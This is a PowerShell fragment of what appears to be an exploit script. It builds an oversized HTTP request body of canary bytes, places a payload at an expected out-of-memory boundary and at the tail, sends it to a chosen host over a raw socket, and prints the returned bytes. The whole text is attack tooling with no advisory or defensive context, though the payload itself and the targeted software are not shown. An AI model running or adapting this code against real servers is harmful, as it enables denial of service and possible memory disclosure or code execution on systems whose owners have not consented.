function New-ExploitBody {
    param([long]$Total, [byte[]]$PayloadBytes, [byte[]]$Canary)
    $body = New-Object byte[] $Total
    $tile = New-Object byte[] 1MB
    $i = 0
    while ($i -lt 1MB) {
        $n = [Math]::Min($Canary.Length, 1MB - $i)
        [Array]::Copy($Canary, 0, $tile, $i, $n)
        $i += $n
    }
    $j = 0
    while ($j -lt $Total) {
        [Array]::Copy($tile, 0, $body, $j, [Math]::Min(1MB, $Total - $j))
        $j += 1MB
    }
    # payload #1 at the expected OOM boundary (halfway), #2 at the very end (the tail)
    [Array]::Copy($PayloadBytes, 0, $body, [int]($Total / 2), $PayloadBytes.Length)
    [Array]::Copy($PayloadBytes, 0, $body, $Total - $PayloadBytes.Length, $PayloadBytes.Length)
    return $body
}

function Invoke-HttpRequest {
    param(
        [string]$TargetHost, [int]$Port, [string]$Method, [string]$Path,
        [byte[]]$Body, [string]$ContentType = 'application/x-www-form-urlencoded',
        [int]$Keep = 65536
    )
    $c = New-Object System.Net.Sockets.TcpClient
    $c.Connect($TargetHost, $Port)
    $s = $c.GetStream()
    $hdr = "$Method $Path HTTP/1.1`r`nHost: $TargetHost`r`nContent-Type: $ContentType`r`nContent-Length: $($Body.Length)`r`nConnection: close`r`n`r`n"
    $hb = [System.Text.Encoding]::ASCII.GetBytes($hdr)
    $s.Write($hb, 0, $hb.Length)
    $off = 0
    while ($off -lt $Body.Length) {
        $n = [Math]::Min(1MB, $Body.Length - $off)
        $s.Write($Body, $off, $n)
        $off += $n
    }
    $s.Flush()

    $ms  = New-Object System.IO.MemoryStream
    $buf = New-Object byte[] 65536
    $got = 0
    while ($got -lt $Keep) {
        $n = $s.Read($buf, 0, $buf.Length)
        if ($n -le 0) { break }
        $ms.Write($buf, 0, $n)
        $got += $n
    }
    try { while ($true) { $n = $s.Read($buf, 0, $buf.Length); if ($n -le 0) { break } } } catch {}
    $c.Close()
    return [PSCustomObject]@{ Raw = $ms.ToArray() }
}

function Show-Bits {
    param([byte[]]$B, [int]$N = 240)
    if (-not $B -or $B.Length -eq 0) { return '(empty body)' }
    $s = [System.Text.Encoding]::ASCII.GetString($B, 0, [Math]::Min($N, $B.Length))
    ($s -replace '[^\x20-\x7e]', '.')
}
